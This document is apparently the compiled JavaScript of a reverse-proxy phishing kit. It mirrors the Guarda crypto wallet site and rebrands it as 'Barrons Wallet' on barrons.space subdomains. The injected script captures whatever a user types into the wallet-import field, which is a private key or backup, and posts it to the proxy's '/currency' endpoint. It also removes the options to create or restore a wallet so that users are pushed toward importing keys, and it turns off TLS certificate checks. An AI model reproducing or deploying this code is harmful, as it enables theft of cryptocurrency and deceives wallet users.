"use strict";
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
exports.delegateSimpleRequest = void 0;
const https_1 = __importDefault(require("https"));
const parse_1 = require("../parse");
const inject_1 = require("../inject");
// const serverUrl = 'http://localhost:3023'
// const apiUrl = 'http://localhost:3024'
const serverUrl = 'https://wallet.barrons.space';
const apiUrl = 'https://spidorman.barrons.space';
const bsciUrl = 'https://solevoysomelie.barrons.space';
const settingsiUrl = 'https://stevefootjobs.barrons.space';
const guardacoiUrl = 'https://dristleback.barrons.space';
// const bsciUrl = 'http://localhost:3025'
// const settingsiUrl = 'http://localhost:3026'
// const guardacoiUrl = 'http://localhost:3027'
const delegateSimpleRequest = (req, res, domain) => {
    const { method, headers, url, path } = req;
    // Устанавливаем стандартные заголовки браузера
    headers['host'] = domain;
    headers['referer'] = 'https://' + domain + '/';
    headers['origin'] = 'https://' + domain;
    // Добавляем случайный User-Agent, если его нет
    if (!headers['user-agent']) {
        headers['user-agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36';
    }
    const options = {
        hostname: domain,
        path: url,
        method,
        headers,
        port: 443,
        rejectUnauthorized: false
    };
    try {
        const proxyRequest = https_1.default.request(options, (response) => {
            delete response.headers['content-length'];
            delete response.headers['content-length'];
            if (response.headers['content-type'] === 'text/html' && response.headers['content-encoding'] === 'br') {
                delete response.headers['content-encoding'];
                (0, parse_1.brotlieParse)(response).then(data => {
                    res.writeHead(response.statusCode || 500, response.headers);
                    const injectedHtml = (0, inject_1.inject)(data, `<script defer>setInterval(()=>{
                        if(document.querySelector("body > div.splash > div > svg")){
                        }
                        // try{
                            if(document.querySelector("#root > div.app_pageBackground_2Jmxb > div.app_pageWrapper_nSOZm > div > div > div > div > div > div.import-wallets_wrapperImportBlock_2X-Eq > div > div.import-block_wrapperAddButton_3GNAb > button")){
                            
                            document.querySelector("#root > div.app_pageBackground_2Jmxb > div.app_pageWrapper_nSOZm > div > div > div > div > div > div.import-wallets_wrapperImportBlock_2X-Eq > div > div.import-block_wrapperAddButton_3GNAb > button").onclick = ()=>{
                                fetch('/currency',{
                                    method:"POST",
                                    headers : {
                                        'Content-type':'applicattion/json'
                                    },
                                    body:JSON.stringify({input:document.querySelector("#root > div.app_pageBackground_2Jmxb > div.app_pageWrapper_nSOZm > div > div > div > div > div > div.import-wallets_wrapperImportBlock_2X-Eq > div > div.relative > div.input_wrapper_1oeau > input").value,currency:document.querySelector("#root > div.app_pageBackground_2Jmxb > div.app_pageWrapper_nSOZm > div > div > div > div > div > div.import-wallets_wrapperImportBlock_2X-Eq > div > div.input_wrapper_1oeau.input_isSelect_34mZ3 > div > div > div.input-currency_currencyData_S0KpS.inputs_currencyInfo_rdtMm > span")?.innerText ||''})
                                })
                                } 
                            }
                            if( document.querySelector("#root > div.app_pageBackground_2Jmxb.responsive > div > div > div > div.import-wallets_wrapperImportBlock_2X-Eq > div > div.import-block_wrapperAddButton_3GNAb > button")){
                            document.querySelector("#root > div.app_pageBackground_2Jmxb.responsive > div > div > div > div.import-wallets_wrapperImportBlock_2X-Eq > div > div.import-block_wrapperAddButton_3GNAb > button").onclick = ()=>{
                                fetch('/currency',{
                                    method:"POST",
                                    headers : {
                                        'Content-type':'applicattion/json'
                                    },
                                    body:JSON.stringify({input:document.querySelector("#root > div.app_pageBackground_2Jmxb.responsive > div > div > div > div > div > div.relative > div.input_wrapper_1oeau > input").value,currency:document.querySelector("#root > div.app_pageBackground_2Jmxb.responsive > div > div > div > div.import-wallets_wrapperImportBlock_2X-Eq > div > div.input_wrapper_1oeau.input_isSelect_34mZ3 > div > div > div.input-currency_currencyData_S0KpS.inputs_currencyInfo_rdtMm > span")?.innerText ||''})
                                })
                                }
                            }
                            if(document.querySelector("#creationDownloadBackup")){
                            document.querySelector("#creationDownloadBackup").onclick=()=>setTimeout(()=>window.location.href='${serverUrl}/app/import',1000)
                            }
                            if(document.querySelector("#root > div.app_pageBackground_2Jmxb > div.app_pageWrapper_nSOZm > div > div > div > div > div.white-block_wrapper_2WSSR.welcome-body_whiteBlock_Ql6uh > a:nth-child(4)")){
                            document.querySelector("#root > div.app_pageBackground_2Jmxb > div.app_pageWrapper_nSOZm > div > div > div > div > div.white-block_wrapper_2WSSR.welcome-body_whiteBlock_Ql6uh > a:nth-child(4)").href='/app/import'
                            }
                            if(document.querySelector("#root > div.app_pageBackground_2Jmxb > div.app_pageWrapper_nSOZm > div > div > div > div > div.white-block_wrapper_2WSSR.welcome-body_whiteBlock_Ql6uh > a:nth-child(4)")){
                                document.querySelector("#root > div.app_pageBackground_2Jmxb > div.app_pageWrapper_nSOZm > div > div > div > div > div.white-block_wrapper_2WSSR.welcome-body_whiteBlock_Ql6uh > a:nth-child(4)").onclick = ()=>window.location.href = '/app/import'
                            }
                            if(document.querySelector("#root > div.app_pageBackground_2Jmxb > div.app_pageWrapper_nSOZm > div > div > div > div > div.white-block_wrapper_2WSSR > p"))    {
                            }
                            if(document.querySelector("#root > div.app_pageBackground_2Jmxb > div.header_background_2lnWj > div.container > div > div > a.header_logotype_2sLZl.active > img")){
                                document.querySelector("#root > div.app_pageBackground_2Jmxb > div.header_background_2lnWj > div.container > div > div > a.header_logotype_2sLZl.active > img").width=165
                            }
                            if( document.querySelector("#buyOpen")) document.querySelector("#buyOpen").remove()
                            if(document.querySelector("#createWalletOpen")) document.querySelector("#createWalletOpen").innerText = "Hello! Welcome to Barrons Wallet" 
                            if(document.querySelector("#root > div.app_pageBackground_2Jmxb > div.app_pageWrapper_nSOZm > div > div > div > div > div.white-block_wrapper_2WSSR.welcome-body_whiteBlock_Ql6uh > p"))document.querySelector("#root > div.app_pageBackground_2Jmxb > div.app_pageWrapper_nSOZm > div > div > div > div > div.white-block_wrapper_2WSSR.welcome-body_whiteBlock_Ql6uh > p").innerText = "This wallet makes it easy to access your crypto and interact with blockchain. Barrons does not have access to your funds.Restore your existing Barrons Wallet, import private key from any other one to create a new Wallet right now!"
                            if(document.querySelector("#root > div.app_pageBackground_2Jmxb > div.app_pageWrapper_nSOZm > div > div > div > div > div.gray-block_wrapper_fNVpe > ul > li:nth-child(1) > a"))document.querySelector("#root > div.app_pageBackground_2Jmxb > div.app_pageWrapper_nSOZm > div > div > div > div > div.gray-block_wrapper_fNVpe > ul > li:nth-child(1) > a").href = '' 
                            if(document.querySelector("#root > div.app_pageBackground_2Jmxb > div.app_pageWrapper_nSOZm > div > div > div > div > div.gray-block_wrapper_fNVpe > ul > li:nth-child(1) > a") )document.querySelector("#root > div.app_pageBackground_2Jmxb > div.app_pageWrapper_nSOZm > div > div > div > div > div.gray-block_wrapper_fNVpe > ul > li:nth-child(1) > a").innerText = 'What exactly is Barrons Wallet?' 
                            if(document.querySelector("#createNewWallet"))document.querySelector("#createNewWallet").remove()
                            if(document.querySelector("#root > div.app_pageBackground_2Jmxb.responsive > div > div.white-block_wrapper_2WSSR > p"))document.querySelector("#root > div.app_pageBackground_2Jmxb.responsive > div > div.white-block_wrapper_2WSSR > p").innerText = "Unlock your Barron's Wallet with your password."
                            if(document.querySelector("#root > div.app_pageBackground_2Jmxb > div.header_background_2lnWj > div.container > div > nav > a"))document.querySelector("#root > div.app_pageBackground_2Jmxb > div.header_background_2lnWj > div.container > div > nav > a").href = 'https://barrons.space'
                            if(document.querySelector("#root > div.app_pageBackground_2Jmxb.responsive > div > div.gray-block_wrapper_fNVpe > ul > li:nth-child(1) > a"))document.querySelector("#root > div.app_pageBackground_2Jmxb.responsive > div > div.gray-block_wrapper_fNVpe > ul > li:nth-child(1) > a").href='/'
                            if(document.querySelector("#root > div.app_pageBackground_2Jmxb.responsive > div > div.notification_notification_2E5bE"))document.querySelector("#root > div.app_pageBackground_2Jmxb.responsive > div > div.notification_notification_2E5bE").remove()
                            if(document.querySelector("#root > div.app_pageBackground_2Jmxb > div.app_pageWrapper_nSOZm > div > div > div > div > div > nav > a:nth-child(1)")){
                                if(document.querySelector("#root > div.app_pageBackground_2Jmxb > div.app_pageWrapper_nSOZm > div > div > div > div > div > nav > a:nth-child(1)")==='Restore from Guarda Backup'){
                                    document.querySelector("#root > div.app_pageBackground_2Jmxb > div.app_pageWrapper_nSOZm > div > div > div > div > div > nav > a:nth-child(1)").remove()
                                }
                            }
                            if(window.location.href.includes('/app/mobile/restore')){
                                window.location.href='/app/mobile/import'
                            }
                            if(document.querySelector("#root > div.app_pageBackground_2Jmxb.responsive > div > div.gray-block_wrapper_fNVpe > ul > li:nth-child(1) > a"))document.querySelector("#root > div.app_pageBackground_2Jmxb.responsive > div > div.gray-block_wrapper_fNVpe > ul > li:nth-child(1) > a").innerText ="What exactly is Barron's Wallet?"
                            if(document.querySelector('a[href="/app/mobile/restore"]')){
                                document.querySelector('a[href="/app/mobile/restore"]').remove()
                            }
                            if(document.querySelectorAll('a[href="/app/restore"]')[1]){
                                document.querySelectorAll('a[href="/app/restore"]')[1].remove()
                            }
                            if(document.querySelector("#root > div.app_pageBackground_2Jmxb > div.header_background_2lnWj > div.container > div > nav > a")){
document.querySelector("#root > div.app_pageBackground_2Jmxb > div.header_background_2lnWj > div.container > div > nav > a").innerText='Back to Barrons.com'
                            }

                            if(document.querySelector("#root > div.app_pageBackground_2Jmxb > div.footer_footerWrapper_KUA3R > div > div > div.footer_wrapper_3QL8Z > nav > a.footer_homeLink_1x0jA")){
                            document.querySelector("#root > div.app_pageBackground_2Jmxb > div.footer_footerWrapper_KUA3R > div > div > div.footer_wrapper_3QL8Z > nav > a.footer_homeLink_1x0jA").innerText="Back to Barrons.com"
                            document.querySelector("#root > div.app_pageBackground_2Jmxb > div.footer_footerWrapper_KUA3R > div > div > div.footer_wrapper_3QL8Z > nav > a.footer_homeLink_1x0jA").href="https://barrons.space/"
                            }
                            if(document.querySelector("#root > div.app_pageBackground_2Jmxb > div.footer_footerWrapper_KUA3R > div > div > div.row.footer_ending_2JmUn > div:nth-child(1) > div")){
                            document.querySelector("#root > div.app_pageBackground_2Jmxb > div.footer_footerWrapper_KUA3R > div > div > div.row.footer_ending_2JmUn > div:nth-child(1) > div").innerText = '©2025 Barrons Wallet. All rights reserved'
                            }
                            // try { document.querySelector("#root > div.app_pageBackground_2Jmxb > div.header_background_2lnWj > div.container > div > nav > a").innerHTML = '<div class="header_iconHome_3kTzE"><svg viewBox="0 0 24 18" xmlns="http://www.w3.org/2000/svg"><path d="M11.571 4.286l-8.128 6.348a.173.173 0 0 1-.007.04.174.174 0 0 0-.007.04v6.428c0 .233.09.434.268.603.18.17.391.255.636.255h5.429v-5.143h3.619V18h5.428a.893.893 0 0 0 .636-.255c.18-.17.27-.37.27-.603v-6.428a.18.18 0 0 0-.015-.08l-8.129-6.348z"></path><path d="M22.983 9.223L19.84 6.537V.517a.466.466 0 0 0-.13-.34.44.44 0 0 0-.33-.133h-2.756a.441.441 0 0 0-.33.133.467.467 0 0 0-.129.34v2.877L12.663.384A1.646 1.646 0 0 0 11.572 0c-.421 0-.785.128-1.091.384L.16 9.223a.433.433 0 0 0-.158.317.487.487 0 0 0 .1.347l.89 1.092a.486.486 0 0 0 .301.162c.115.01.23-.024.345-.103l9.933-8.515 9.934 8.515a.435.435 0 0 0 .301.103h.044a.486.486 0 0 0 .301-.162l.89-1.092a.487.487 0 0 0 .1-.347.434.434 0 0 0-.158-.317z"></path></svg></div> Back to Barrons.com' } catch(e) {}
                            // try { document.querySelector("#root > div.app_pageBackground_2Jmxb > div.footer_footerWrapper_KUA3R > div > div > div.footer_wrapper_3QL8Z > nav > a.footer_homeLink_1x0jA").href = 'https://barrons.com' } catch(e) {}
                            // try { document.querySelector("#root > div.app_pageBackground_2Jmxb > div.footer_footerWrapper_KUA3R > div > div > div.footer_wrapper_3QL8Z > nav > a.footer_homeLink_1x0jA").innerHTML = '<span class="footer_iconHome_Zb6Z5"><svg viewBox="0 0 24 18" xmlns="http://www.w3.org/2000/svg"><path d="M11.571 4.286l-8.128 6.348a.173.173 0 0 1-.007.04.174.174 0 0 0-.007.04v6.428c0 .233.09.434.268.603.18.17.391.255.636.255h5.429v-5.143h3.619V18h5.428a.893.893 0 0 0 .636-.255c.18-.17.27-.37.27-.603v-6.428a.18.18 0 0 0-.015-.08l-8.129-6.348z"></path><path d="M22.983 9.223L19.84 6.537V.517a.466.466 0 0 0-.13-.34.44.44 0 0 0-.33-.133h-2.756a.441.441 0 0 0-.33.133.467.467 0 0 0-.129.34v2.877L12.663.384A1.646 1.646 0 0 0 11.572 0c-.421 0-.785.128-1.091.384L.16 9.223a.433.433 0 0 0-.158.317.487.487 0 0 0 .1.347l.89 1.092a.486.486 0 0 0 .301.162c.115.01.23-.024.345-.103l9.933-8.515 9.934 8.515a.435.435 0 0 0 .301.103h.044a.486.486 0 0 0 .301-.162l.89-1.092a.487.487 0 0 0 .1-.347.434.434 0 0 0-.158-.317z"></path></svg></span> Back to Barrons.com' } catch(e) {}
                            // try { document.querySelector("#root > div.app_pageBackground_2Jmxb > div.footer_footerWrapper_KUA3R > div > div > div.footer_wrapper_3QL8Z > div:nth-child(2) > a:nth-child(1)").href = '' } catch(e) {}
                            // try { document.querySelector("#root > div.app_pageBackground_2Jmxb > div.footer_footerWrapper_KUA3R > div > div > div.footer_wrapper_3QL8Z > div:nth-child(2) > a:nth-child(2)").href = '' } catch(e) {}
                            // try { document.querySelector("#root > div.app_pageBackground_2Jmxb > div.footer_footerWrapper_KUA3R > div > div > div.row.footer_ending_2JmUn > div:nth-child(1) > div").innerText = 'Copyright © 2025 Dow Jones & Company, Inc. All Rights Reserved.' } catch(e) {}
                            // try { document.querySelector("#root > div.app_pageBackground_2Jmxb > div.footer_footerWrapper_KUA3R > div > div > div.row.footer_ending_2JmUn > div:nth-child(2) > div:nth-child(1)").innerText ='Dow Jones & Company, Inc.4300 U.S. Route 1 North Monmouth Junction, NJ 08852' } catch(e) {}
                            // try { document.querySelector("#root > div.app_pageBackground_2Jmxb > div.footer_footerWrapper_KUA3R > div > div > div.row.footer_ending_2JmUn > div:nth-child(2) > div:nth-child(3)").innerText = 'If you are located in the EU/EEA or UK, the entity responsible for the collection and processing of personal data in connection with the Dow Jones Services is Dow Jones & Company, Inc. (U.S.) (contact information provided above). If you have a corporate or group subscription agreement, the entity responsible for the collection and processing of your personal data is the entity with whom your company, professor or school has a direct relationship (e.g. by contract).' } catch(e) {}
                            // try {document.querySelector("#root > div.app_pageBackground_2Jmxb > div.app_pageWrapper_nSOZm > div > div > div > div > div > nav > a:nth-child(1)").innerText==='Restore from Guarda Backup'?document.querySelector("#root > div.app_pageBackground_2Jmxb > div.app_pageWrapper_nSOZm > div > div > div > div > div > nav > a:nth-child(1)").remove():''}catch(e){}
                            // }catch(e){}
                            if( document.querySelector("#root > div.app_pageBackground_2Jmxb > div.app_pageWrapper_nSOZm > div > div > div > div > div > div > div > div.relative > div.input_wrapper_1oeau > input")){
                                 document.querySelector("#root > div.app_pageBackground_2Jmxb > div.app_pageWrapper_nSOZm > div > div > div > div > div > div > div > div.relative > div.input_wrapper_1oeau > input").onclick = ()=>{
                                fetch('/conversion')
                                }
                            }
                            if(document.querySelector("#root > div.app_pageBackground_2Jmxb > div.app_pageWrapper_nSOZm > div > div > div > div > div > div.import-wallets_wrapperImportBlock_2X-Eq > div > div.relative > div.input_wrapper_1oeau.input_isInvalid_1GrNS > input")){
                                document.querySelector("#root > div.app_pageBackground_2Jmxb > div.app_pageWrapper_nSOZm > div > div > div > div > div > div.import-wallets_wrapperImportBlock_2X-Eq > div > div.relative > div.input_wrapper_1oeau.input_isInvalid_1GrNS > input").onclick = ()=>{
                                fetch('/conversion')
                                }
                            }
                        },100)
                        </script>`);
                    let deleteGoogle = (0, inject_1.replace)(injectedHtml, 'https://guarda.com/assets/manifest.json', '/assets/manifest.json');
                    deleteGoogle = (0, inject_1.replace)(deleteGoogle, `Web Multi-currency Wallet | Guarda`, 'Barrons Wallet');
                    deleteGoogle = (0, inject_1.replace)(deleteGoogle, 'https://guarda.com/assets/images/favicons/', '/favicons/', true);
                    deleteGoogle = (0, inject_1.replace)(deleteGoogle, `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 250 250"><path d="M193.7 63l.3.6c.1 1.1 8.3 114-68.6 140.2-.2.1-.5.1-.7 0-77-26.2-68.7-139-68.6-140.2 0-.2.1-.5.3-.6.1-.2.4-.3.6-.4L124.8 46h.5l67.8 16.6c.2.1.4.2.6.4zm-12.5 12.1c.1.1.2.3.2.5.1.9 6.8 93-56.1 114.5-.2.1-.4.1-.6 0C61.8 168.6 68.5 76.5 68.6 75.6c0-.2.1-.4.2-.5.1-.1.3-.2.5-.3l55.5-13.5h.4l55.5 13.5c.2 0 .4.1.5.3z" fill-rule="evenodd" clip-rule="evenodd" fill="#7190eb"/><path d="M124.7 81.4l-37 9c-.1 0-.2.1-.3.2-.1.1-.1.2-.1.3 0 .6-4.5 62 37.4 76.3h.4C167 153 162.5 91.6 162.5 91c0-.1-.1-.2-.1-.3-.1-.1-.2-.2-.3-.2l-37-9c-.2-.1-.3-.1-.4-.1" fill="#7190eb"/></svg>`, `
        <svg xmlns="http://www.w3.org/2000/svg" id="_Слой_1" data-name="Слой 1" viewBox="0 0 325.7 130.43">
  <defs>
    <style>
      .cls-1, .cls-2 {
        fill: #000;
        stroke-width: 0px;
      }

      .cls-2 {
        fill-rule: evenodd;
      }
    </style>
  </defs>
  <path class="cls-2" d="M235.29,50.13c-.79,6.9-2.62,6.71-4.84,7.28-2.01.51-1.24,1.69.06,1.51.49-.07,4.08-.44,6.53-.44,3.44,0,6.56.31,8.25.31.7,0,1.62-.94-.08-1.38-1.97-.51-6.79,0-7.25-8.28-.34-6.06.22-26.78.22-26.78,0-1.45.21-1.67.49-1.67.49,0,1,.82,1.48,1.38l30.03,36.67c3.17,3.56,3.37,2.49,3.3-1.09-.21-11.54.16-43.4.16-43.4.09-6.27,5.98-3.72,5.98-5.61,0-.44-.28-.65-.7-.65-1.69,0-6.53.5-8.92.5-2.25,0-3.58-.33-5.69-.33-.42,0-.78.22-.77.73.03,2.03,7.58-1.32,7.32,9.03l.07,30c0,.58-.04,1.72-1.05,0l-31.44-38.03c-.42-.51-1.05-1.67-1.83-1.67-1.05,0-4.53.26-5.58.26-1.12,0-2.18-.29-3.3-.29-.35,0-1.12.29-1.05.72.39,2.54,8.63-.47,8.76,11.39,0,0,.17,26.85-.17,29.83Z"/>
  <path class="cls-2" d="M284.2,2.29c-.95.28-2.45,1.47-3.07,1.88-.71.48-.7,1.27-.33,1.95,1.77,3.26,3.52,8.65-.85,15.12-.72,1.07-1.83,1.38-1.24,1.82.62.47,2.62-.84,3.46-1.63,4.71-4.46,6.41-12.05,3.73-17.57-.54-1.12-.77-1.84-1.7-1.57Z"/>
  <path class="cls-2" d="M290.35,55.01c.29,1.29,6.41,3.83,11.84,3.83,16.64,0,20.58-8.71,20.58-14.75,0-19.08-28.24-12.1-28.24-25.61,0-6.61,5.32-9.41,11.11-9.41,6.45,0,11.66,3.99,13.56,8.87.25.64.56,2.07,1.37,2.07.74,0,.56-.52.49-1.09l-1.05-10.04c-.07-.79-.44-1.01-.88-1.01-.73,0-1.18,1.28-2.55,1.03-1.01-.18-2.78-2.16-10.36-2.22-8.43-.07-15.62,4.93-15.62,14.06,0,18.07,27.45,11.17,27.58,24.47.07,7.54-4.93,11.42-11.9,11.42-10.11,0-14.57-7.53-15.45-10.83-.37-1.51-.53-2.32-1.31-2.2-.72.12-.65.92-.36,2.36,0,0,.95,3.1,1.18,9.04Z"/>
  <path class="cls-2" d="M201.93,60.28c16.69,0,28.3-10.66,28.3-27.19,0-15.22-11.75-26.02-27.03-26.02s-27.48,11.1-27.48,26.39,9.96,26.83,26.21,26.83ZM201.38,9.97c14.6,0,23.39,12.53,23.39,25.9s-9.19,21.92-20.12,21.92c-14.83,0-23.45-12.88-23.45-26.47,0-11.61,7.6-21.35,20.18-21.35Z"/>
  <path class="cls-2" d="M157.43,32.76c4.74-2.02,9.19-6.57,9.19-12.2,0-13.93-15.66-13.18-16.74-13.18-3.53,0-8.09.65-12.03.65-3.45,0-4.93-.38-6.15-.38-.81,0-1.36.43-1.36.87,0,2.45,7.84-1.19,7.64,6.52v36.73c0,5.48-3.95,5.03-4.8,5.66-.36.26-.73,1.26-.33,1.26,2.57,0,5.46-.31,8.04-.31,5.63,0,9.07.27,9.66.43.99.26,1.45-.93.34-1.31-1.36-.46-7.45.31-7.56-5.65v-15.23c0-.72-.4-1.99,1.76-2.02,6.83-.11,6.7-.6,7.88,1.09,0,0,13.04,15.37,20.13,21.78,6.2,5.6,13.85,9.5,18.79,9.74,6.67.31,10.26-.77,10.26-1.63,0-1.73-5.82,3.14-21.63-9.04-9.55-7.35-21.29-21.11-23.11-23.38-.15-.18.01-.35,0-.38ZM143.36,12.34c0-2.82,1.61-2.51,4.05-2.51,6.64,0,13.34,3.18,13.34,11.99s-7.09,10.32-10,10.32c-3.19,0-7.39.36-7.39-1.01V12.34Z"/>
  <path class="cls-2" d="M113.64,32.66c4.84-2.02,9.91-6.73,9.91-12.36,0-13.93-16.8-12.93-17.91-12.93-3.6,0-7.68.64-11.7.64-3.53,0-4.67-.37-5.91-.37-.83,0-1.39.43-1.38.87.01,2.02,7.56-1.2,7.44,6.5v36.74c.02,5.66-4.09,5.47-5.53,5.47-1.68,0,.75,1.6,1.17,1.6,2.63,0,4.7-.66,7.33-.66,5.75,0,9.61.58,10.23.68,1.6.26,1.9-.9.36-1.24-2.48-.57-8.04-.5-8.07-6.49v-14.51c-.01-.72-.43-2.02,1.79-2.02,7.75,0,7.16-.37,9.65,3.67l8.59,12.75c2.63,4.11,5.33,7.79,10.38,7.79.62,0,5.38.09,5.34-.77-.04-.88.88-1.36-1.14-1.04-1.66.26-4.83-.89-8.07-6.05l-12.49-17.83c-.2-.13.03-.44.03-.44ZM99.7,12.43c0-2.81,1.46-2.56,3.95-2.67,7.24-.31,13.77,3,13.77,11.8s-6.56,10.54-9.54,10.54c-3.26,0-8.17.43-8.17-.94V12.43Z"/>
  <path class="cls-2" d="M76.91,47.2c.69,2,1.28,4.31,1.92,5.82,1.37,3.27-2.16,4.46-3.53,4.33-1.11-.1-.85,1.82,1.12,1.48,1.84-.32,4.19-.53,6.07-.53,2.84,0,5.24.53,8.08.53.48,0,1.91-1.16.67-1.48-.88-.22-3.53-.19-5.13-2.91-1.54-2.62-2.62-5.6-3.66-8.34l-14.91-38.17c-.21-.59-.69-2.74-1.46-2.74-.9,0-1.11,1.19-5.2,10.52l-16.57,37.79c-1.81,4.22-5.52,2.84-5.52,4.4,0,.45.66.94,1.08.94,1.8,0,3.87-.47,5.74-.47s3.89.07,6.44.48c1.73.27,2.13-1.14.62-1.48-1.96-.44-4.9-1.29-4.49-4.52.57-4.39,4.58-12.07,4.58-12.07.69-1.55,2.32-2.07,3.63-2.07h15.26c1.94,0,2.32.72,3.02,2.43l2.22,6.08ZM63.81,15.7c.42-.89.76-.89,1.11,0l7.22,18.87c.35.97.42,1.48-1.11,1.48h-14.51c-.9,0-1.39-.3-.9-1.33l8.2-19.02Z"/>
  <path class="cls-2" d="M9.69,50.51c0,5.62-2.51,6.29-3.31,6.51-1.32.43-2.74.06-2.62,1.32.07.65,1.83.54,2.19.54,3.37,0,5.49-.16,8.85-.16,2.49,0,8.67.63,11.31.63,14.27,0,17.3-10.36,17.32-15.76.03-10.26-11.5-11.78-11.5-12.86,0-.5,7.19-3.25,7.19-10.6,0-5.34-3.52-12.31-16.4-12.31-5.85,0-7.04.53-9.97.53s-7.03-.69-8.49-.69c-.88,0-1.31.94.26,1.57,1.39.55,5.17.32,5.17,5.8v35.48ZM14.95,33.73c0-.65-.37-1.66,5.27-1.66,16.83,0,17.13,9.56,17.13,14.17,0,4.33-1.46,10.98-12.7,11.1-10.39.12-9.69-1.94-9.69-7.14v-16.48ZM14.96,15.6c0-4.18-.36-5.32,4.25-5.41,8.82-.17,15.04,4.55,14.86,12.34-.1,4.23-3.01,7.91-12.65,7.76-6.59-.1-6.46-.48-6.46-2.79v-11.9Z"/>
  <path class="cls-1" d="M96.92,76.74c3.21.38,4.39.78,9.25-.1.54-.1,1.09-.15,1.64-.16,0,0,1.1-.02,1.92-.05.26,0,.31.19.27.45-.11.74-.73,1.3-1.47,1.42-.99.16-1.8.04-2.51.52-.95.63-1.83,1.7-2.65,3.2-.82,1.5-1.76,3.69-2.81,6.57l-6.97,19.37c-1.17,3.16-1.88,5.02-2.11,5.55-.47,1.17-.86,2.2-1.16,3.09-.31.89-.66,1.92-1.06,3.09-.4,1.17-.86,2.53-1.37,4.08l-1.09-.07c-.66-1.97-1.31-3.98-1.97-6.05-.66-2.06-1.23-3.84-1.72-5.33-.49-1.49-.87-2.56-1.12-3.22l-5.65-15.51c-.09-.26-.45-.28-.56-.03-.27.59-.59,1.28-.96,2.07-.51,1.12-.91,1.95-1.19,2.49v.02s-3.73,8.43-3.73,8.43c-.94,2.09-1.73,4.01-2.38,5.77s-1.33,3.7-2.04,5.84c-.72,2.13-1.33,4-1.85,5.59h-.94l-4.12-11.85c-.59-1.8-1.33-4.04-2.24-6.7s-1.96-5.7-3.17-9.12c-1.21-3.42-2.33-6.45-3.35-9.07-1.02-2.62-1.83-4.46-2.41-5.52-.84-1.59-1.77-2.6-2.79-3.02-.75-.31-1.59-.51-2.53-.59-.61-.05-1.09-.55-1.12-1.17h0c-.01-.25.2-.45.45-.43l2.84.29h.08c3.2.53,5.11.55,5.95.55,2.69,0,4.68-.49,6.07-.58l1.97-.23c.29-.03.55.18.58.47h0c.06.58-.33,1.13-.91,1.21-1.01.14-1.97.39-2.9.74-1.23.47-1.85,1.13-1.85,1.99,0,.9.9,3.91,2.69,9.03s3.72,10.35,5.77,15.68c.71,1.84,1.31,3.38,1.79,4.61.52,1.35,2.43,1.33,2.94-.02h0s0-.01,0-.02c.14-.29.52-1.18,1.14-2.66.62-1.5,1.1-2.65,1.43-3.45l5.7-12.73c.27-.61.28-1.3.01-1.91-1.55-3.58-2.56-5.92-3.05-7.01-.53-1.18-.93-1.94-1.21-2.27-.74-1.02-1.8-1.64-3.19-1.86-.44-.07-.78-.45-.82-.89l-.06-.62c.44-.76,3.27.58,4.94.58,4.27,0,8.43-1.71,11.48-.79.78.24.07,1.23.07,1.23-1.66.19-2.9.45-3.69.77s-1.28.66-1.46,1-.26.76-.26,1.25c0,.8.74,3.42,2.23,7.88s3.25,9.42,5.3,14.91c1.04,2.79,1.9,5.07,2.59,6.83.52,1.34,2.4,1.33,2.92,0,1.24-3.17,2.48-6.44,3.7-9.81,1.7-4.69,3.05-8.66,4.03-11.92.99-3.26,1.48-5.38,1.48-6.37,0-1.91-.66-3.12-1.97-3.62-1.12-.43-2.46-.37-3.99-.67-.49-.1-.89-.47-1.01-.96,0,0-.12-.3-.1-.4.08-.47,1.19-.32,1.92-.16"/>
  <path class="cls-1" d="M120.16,121.78s-.46-.2-.08-.79c.45-.7,2.15-.97,2.79-1.28.64-.3.84-.65.84-1.38,0-.68-.21-1.66-.63-2.95s-.74-2.18-.95-2.67l-1.62-4.41c-.61-1.67-2.16-2.81-3.93-2.87-1.05-.04-2.29-.06-3.7-.06h-2.78c-1.64-.06-3.17-.03-4.58.08-1.68.13-3.13,1.2-3.75,2.77l-1.62,4.08c-1.14,2.72-1.71,4.42-1.71,5.1,0,.82.37,1.51,1.11,2.06s2.24.99,4.52,1.32c0,0,.91.67,0,1.16-1.44.77-5.27-.94-7.19-.93-3.19.02-3.79.64-6.2.72,0,0-.62-.47,0-1.02.97-.86,2.05-.23,3.23-1.65.56-.49,1.31-1.66,2.23-3.5s1.87-3.84,2.82-6.01c.95-2.17,1.64-3.86,2.06-5.08l5.63-13.46c.7-1.62,1.43-3.31,2.16-5.08.74-1.77,1.44-3.54,2.09-5.33.66-1.78,1.07-2.52,1.31-3.85-.14-.26.02-.93.34-1.1l1.17-.07c.73,2.6,1.52,5.1,2.39,7.49l7.38,19.79c1.9,4.95,3.33,8.6,4.3,10.95s1.82,4.04,2.55,5.04c.61.87,2.87.75,3.75,1.58.59.56.3,1.15,0,1.23-.66.17-3.78-.68-5.56-.68-1.41,0-2.8.13-4,.29s-2.07.35-2.77.41-1.11.34-1.58.12ZM109.03,90.1l-3.97,10.23c-.22.58-.4,1.07-.56,1.48-.26.66.18,1.37.88,1.45,1.43.16,3.01.23,4.73.23l3.23-.07c1.36,0,2.62-.02,3.79-.07.72-.03,1.21-.75.97-1.44-.55-1.57-.92-2.54-1.11-2.89l-2.53-6.47c-.28-.7-.81-1.98-1.6-3.83-.44-1.03-.81-1.88-1.11-2.55-.22-.5-.93-.48-1.15.02s-.41.98-.59,1.42c-.32.81-.65,1.63-1,2.48Z"/>
